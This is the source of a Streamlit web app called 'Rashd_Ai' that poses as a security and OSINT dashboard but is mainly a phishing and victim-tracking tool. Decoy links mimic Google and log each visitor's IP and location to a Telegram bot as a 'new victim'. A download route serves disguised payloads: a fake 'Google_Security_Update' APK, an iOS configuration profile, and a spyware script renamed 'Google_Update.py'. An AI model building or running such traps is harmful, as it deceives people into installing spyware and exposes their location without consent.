import streamlit as st
import requests
import json
import os
from datetime import datetime
import victim_logger
import config
import base64
import uuid

# إعداد متغيرات البيئة من config لضمان عمل المكتبات الخارجية
os.environ["TAVILY_API_KEY"] = config.get_key("TAVILY_API_KEY")
os.environ["GROQ_API_KEY"] = config.get_key("GROQ_API_KEY")
os.environ["GEMINI_API_KEY"] = config.get_key("GEMINI_API_KEY")

# استيراد الوحدات الخاصة بالأدوات (مع معالجة الخطأ إذا لم تكن موجودة)
try:
    import domain_osint
    import ai_pentest
    import port_scanner
    import network_mapper
    import google_dork
    import vuln_scanner
    import darkweb_search
    import ai_threat
    import email_osint
    import phone_osint
    import website_scan
    import username_osint
    import geoip_osint
    import attack_surface
    import ai_analysis
    import report_generator
    from ai_hacking import AIHackingAssistant
except ImportError as e:
    st.warning(f"بعض المكتبات مفقودة: {e}. سيتم تشغيل الأدوات الأساسية فقط.")

# إعدادات الصفحة
st.set_page_config(page_title="Rashd_Ai - CyberShield Pro", page_icon="🛡️", layout="wide")

# تصميم الواجهة العصرية (Modern UI & Glassmorphism)
st.markdown("""
    <style>
    /* الخلفية العامة */
    .stApp {
        background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
        color: #f8fafc;
    }
    
    /* تصميم البطاقات (Cards) */
    .st-emotion-cache-1r6slb0, .st-emotion-cache-12w0qpk {
        background: rgba(30, 41, 59, 0.7) !important;
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        border-radius: 15px !important;
        padding: 20px !important;
    }
    
    /* حاوية المحادثة الثابتة (Fixed Chat Container) */
    .chat-container {
        height: 400px;
        overflow-y: auto;
        padding: 15px;
        background: rgba(15, 23, 42, 0.5);
        border-radius: 12px;
        border: 1px solid rgba(255, 255, 255, 0.05);
        margin-bottom: 10px;
        display: flex;
        flex-direction: column;
    }
    
    /* فقاعات المحادثة */
    .user-msg {
        align-self: flex-end;
        background: #3b82f6;
        color: white;
        padding: 10px 15px;
        border-radius: 15px 15px 0 15px;
        margin: 5px 0;
        max-width: 80%;
    }
    .ai-msg {
        align-self: flex-start;
        background: #334155;
        color: #f1f5f9;
        padding: 10px 15px;
        border-radius: 15px 15px 15px 0;
        margin: 5px 0;
        max-width: 80%;
        border: 1px solid rgba(255, 255, 255, 0.1);
    }
    
    /* تحسين الأزرار */
    .stButton>button {
        background: linear-gradient(90deg, #ef4444 0%, #dc2626 100%) !important;
        color: white !important;
        border: none !important;
        border-radius: 8px !important;
        font-weight: 600 !important;
        transition: all 0.3s ease !important;
    }
    .stButton>button:hover {
        transform: translateY(-2px);
        box-shadow: 0 4px 12px rgba(220, 38, 38, 0.4);
    }
    
    /* إخفاء واجهة Streamlit */
    #MainMenu {visibility: hidden;}
    footer {visibility: hidden;}
    header {visibility: hidden;}
    .stApp [data-testid="stToolbar"] {display: none;}
    #manage-app-button {display: none !important;}
    </style>
    """, unsafe_allow_html=True)

# دالة جلب الـ IP العام الحقيقي
def get_real_public_ip():
    try:
        headers = st.context.headers
        if "X-Forwarded-For" in headers:
            ip = headers["X-Forwarded-For"].split(",")[0].strip()
            if not ip.startswith(("10.", "172.", "192.168.")):
                return ip
        return requests.get("https://api.ipify.org", timeout=5).text
    except:
        return "Unknown"

# دالة إرسال التنبيه لتلجرام
def send_telegram_alert(ip, trap_name, device="Unknown"):
    token = config.get_key("TELEGRAM_BOT_TOKEN")
    chat_id = config.get_key("TELEGRAM_CHAT_ID")
    if not token or not chat_id: return
    geo_data = {"country": "Unknown", "city": "Unknown", "isp": "Unknown"}
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if res.get("status") == "success":
            geo_data = {"country": res.get("country", "Unknown"), "city": res.get("city", "Unknown"), "isp": res.get("isp", "Unknown")}
    except: pass
    message = f"🎯 تنبيه: ضحية جديدة!\n📍 IP: {ip}\n🌍 {geo_data['country']} - {geo_data['city']}\n🏢 {geo_data['isp']}\n📱 {device}\n🎯 {trap_name}"
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": chat_id, "text": message})
        victim_logger.log_victim(ip, geo_data['country'], geo_data['city'], geo_data['isp'], trap_name)
    except: pass

# التحقق من وضع التمويه
query_params = st.query_params
if "decoy" in query_params:
    client_ip = get_real_public_ip()
    trap_name = query_params.get("trap", "Google Decoy")
    if "alert_sent" not in st.session_state:
        send_telegram_alert(client_ip, trap_name)
        st.session_state.alert_sent = True
    with open("index.html", "r", encoding="utf-8") as f:
        html_content = f.read()
    st.components.v1.html(html_content, height=1000, scrolling=False)
    st.stop()

# معالجة طلبات التحميل
if "download" in query_params:
    device = query_params.get("device", "pc")
    ip = get_real_public_ip()
    send_telegram_alert(ip, f"Download ({device})", device)
    if device == "android":
        file_name, content, mime = "Google_Security_Update.apk", b"Fake APK", "application/vnd.android.package-archive"
    elif device == "ios":
        file_name, content, mime = "Google_Security.mobileconfig", f"""<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>PayloadContent</key><array><dict><key>PayloadDisplayName</key><string>Google Security</string><key>PayloadType</key><string>com.apple.webClip.managed</string><key>URL</key><string>https://rashdai.streamlit.app/?decoy=google</string><key>Label</key><string>Google Security</string></dict></array><key>PayloadDisplayName</key><string>Google Security Update</string><key>PayloadType</key><string>Configuration</string><key>PayloadUUID</key><string>{uuid.uuid4()}</string><key>PayloadVersion</key><integer>1</integer></dict></plist>""".encode('utf-8'), "application/x-apple-aspen-config"
    else:
        file_name, content, mime = "Google_Update.py", open("spy_full.py", "rb").read() if os.path.exists("spy_full.py") else b"print('Update')", "application/octet-stream"
    st.download_button("بدء التحميل الآمن", content, file_name=file_name, mime=mime)
    st.stop()

# تسجيل الدخول
if "authenticated" not in st.session_state: st.session_state.authenticated = False
if not st.session_state.authenticated:
    st.title("🛡️ Rashd_Ai Login")
    with st.form("login"):
        u, p = st.text_input("User"), st.text_input("Pass", type="password")
        if st.form_submit_button("Login"):
            if u == config.ADMIN_USERNAME and p == config.ADMIN_PASSWORD:
                st.session_state.authenticated = True
                st.rerun()
            else: st.error("Wrong credentials")
    st.stop()

# القائمة الجانبية
with st.sidebar:
    st.markdown("<h1 style='text-align: center; color: #ef4444;'>🛡️ Rashd_Ai</h1>", unsafe_allow_html=True)
    menu = st.selectbox("Navigation", ["📊 Dashboard", "🔍 OSINT Intelligence", "🛡️ Security Scan", "🧠 AI Analysis", "🎯 Trap System", "⚙️ Settings"])
    st.markdown("---")
    if st.button("Logout"):
        st.session_state.authenticated = False
        st.rerun()

# 1. Dashboard
if menu == "📊 Dashboard":
    st.header("📊 Dashboard Overview")
    victims = victim_logger.get_all_victims()
    c1, c2, c3 = st.columns(3)
    c1.metric("Total Victims", len(victims))
    c2.metric("Active Tools", "18")
    c3.metric("System Status", "Online ✅")
    
    st.subheader("💬 Rashd_Ai Assistant")
    # حاوية المحادثة الثابتة
    if "messages" not in st.session_state: st.session_state.messages = []
    
    chat_html = "<div class='chat-container'>"
    for msg in st.session_state.messages:
        cls = "user-msg" if msg["role"] == "user" else "ai-msg"
        chat_html += f"<div class='{cls}'>{msg['content']}</div>"
    chat_html += "</div>"
    st.markdown(chat_html, unsafe_allow_html=True)
    
    with st.form("chat_input_form", clear_on_submit=True):
        prompt = st.text_input("Type your message...", key="chat_input")
        if st.form_submit_button("Send"):
            if prompt:
                st.session_state.messages.append({"role": "user", "content": prompt})
                try:
                    response = AIHackingAssistant().chat(prompt)
                except: response = f"I am your AI assistant. Received: {prompt}"
                st.session_state.messages.append({"role": "assistant", "content": response})
                st.rerun()

    st.subheader("🎯 Recent Victims")
    if victims: st.table(victims[:5])
    else: st.info("No victims yet.")

# 2. OSINT
elif menu == "🔍 OSINT Intelligence":
    st.header("🔍 OSINT Tools")
    t1, t2, t3, t4 = st.tabs(["🌐 Domain", "👤 User", "📧 Email", "📱 Phone"])
    with t1:
        d = st.text_input("Domain Name")
        if st.button("Analyze Domain"):
            try: st.write(domain_osint.whois_lookup(d))
            except: st.error("Tool error")
    with t2:
        u = st.text_input("Username")
        if st.button("Search User"):
            try: st.write(username_osint.username_search(u))
            except: st.error("Tool error")
    with t3:
        e = st.text_input("Email Address")
        if st.button("Search Email"):
            try: st.write(email_osint.search_email(e))
            except: st.error("Tool error")
    with t4:
        p = st.text_input("Phone Number")
        if st.button("Lookup Phone"):
            try: st.write(phone_osint.lookup(p))
            except: st.error("Tool error")

# 3. Security Scan
elif menu == "🛡️ Security Scan":
    st.header("🛡️ Security Tools")
    t1, t2, t3 = st.tabs(["🔍 Web Scan", "🔌 Port Scan", "⚠️ Vuln Scan"])
    with t1:
        u = st.text_input("Website URL")
        if st.button("Scan Website"):
            try: st.write(website_scan.detect_tech(u))
            except: st.error("Tool error")
    with t2:
        i = st.text_input("Target IP")
        if st.button("Scan Ports"):
            try: st.write(port_scanner.scan(i))
            except: st.error("Tool error")
    with t3:
        i = st.text_input("Target for Vulns")
        if st.button("Scan Vulnerabilities"):
            try: st.write(vuln_scanner.scan(i))
            except: st.error("Tool error")

# 4. AI Analysis
elif menu == "🧠 AI Analysis":
    st.header("🧠 AI Security Analysis")
    data = st.text_area("Input data for analysis")
    if st.button("Analyze with AI"):
        try: st.write(ai_analysis.analyze_data(data))
        except: st.error("Tool error")

# 5. Trap System
elif menu == "🎯 Trap System":
    st.header("🎯 Trap Management")
    tid = st.text_input("Trap ID", value="Google_Trap")
    url = f"https://rashdai.streamlit.app/?decoy=google&trap={tid}"
    st.code(url)
    st.info("This link mimics Google and triggers auto-download.")
    if st.button("Refresh Victim Log"):
        st.table(victim_logger.get_all_victims())

# 6. Settings
elif menu == "⚙️ Settings":
    st.header("⚙️ System Settings")
    st.success("API Keys integrated via Secrets.")
    st.info("Version: 3.0.0 (Modern UI Edition)")
